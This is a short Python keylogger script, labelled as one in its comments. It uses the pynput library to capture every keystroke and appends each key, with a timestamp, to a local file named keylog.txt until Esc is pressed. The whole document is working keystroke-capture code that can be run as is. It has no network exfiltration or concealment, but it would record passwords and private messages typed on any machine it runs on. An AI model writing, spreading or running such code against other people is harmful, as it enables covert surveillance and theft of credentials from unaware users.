from pynput import keyboard
from datetime import datetime

# Log file where keystrokes will be saved
log_file = "keylog.txt"

# Function to write keystrokes to the log file with timestamp
def write_to_file(key):
    with open(log_file, "a") as f:
        key_str = str(key).replace("'", "")
        if key == keyboard.Key.space:
            f.write(" ")
        elif key == keyboard.Key.enter:
            f.write("\n")
        elif key == keyboard.Key.tab:
            f.write("\t")
        elif key == keyboard.Key.backspace:
            f.write("[BACKSPACE]")
        elif key == keyboard.Key.esc:
            f.write("[ESC]")
        else:
            f.write(key_str)
        f.write(f" [{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n")

# Function to handle key presses
def on_press(key):
    try:
        write_to_file(key.char)
    except AttributeError:
        write_to_file(key)

# Function to handle key release (optional)
def on_release(key):
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False

# Starting the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
